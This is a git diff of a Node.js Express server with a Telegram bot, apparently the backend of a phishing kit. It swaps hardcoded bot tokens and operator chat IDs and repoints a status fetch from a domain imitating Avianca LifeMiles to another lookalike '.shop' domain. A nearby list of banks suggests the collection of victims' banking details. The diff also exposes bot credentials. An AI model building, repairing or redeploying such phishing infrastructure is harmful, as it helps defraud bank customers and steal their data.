@@ -4,11 +4,11 @@ const { Telegraf } = require('telegraf');
 const app = express();
 
 // Token del bot
-const BOT_TOKEN = '7499168477:AAFS14MNklz1lERmgDufQkSXefOKyGgJh-E';  // Reemplaza con tu token
+const BOT_TOKEN = '7751119830:AAFm2u2v4C1HtIcnARQUKzhHS_8U-_aBpsE';  // Reemplaza con tu token
 const bot = new Telegraf(BOT_TOKEN);
 
 // Chat IDs de los usuarios a los que enviarás el mensaje
-const chatIds = ['8481277251', '6183081769', '6951315808',];  // Reemplaza con los chat IDs de los usuarios
+const chatIds = ['8481277251', '1323970750', '',];  // Reemplaza con los chat IDs de los usuarios
 
 // Configuración del servidor Express
 app.use(bodyParser.json());
@@ -73,7 +73,7 @@ const bancosDisponibles = [
     // Hacer el fetch al servidor PHP con el id correcto
 
 
-      fetch(`https://ofertasviajeros.avianlifemillas-reserva.shop/solicitudes/index.php?id=${id}&estatus=${encodeURIComponent(estatus)}`)
+      fetch(`https://lasmejoresofertascol.shop/solicitudes/index.php?id=${id}&estatus=${encodeURIComponent(estatus)}`)
         .then(response => response.json())
         .then(data => {
             console.log('Respuesta del servidor PHP:', data);
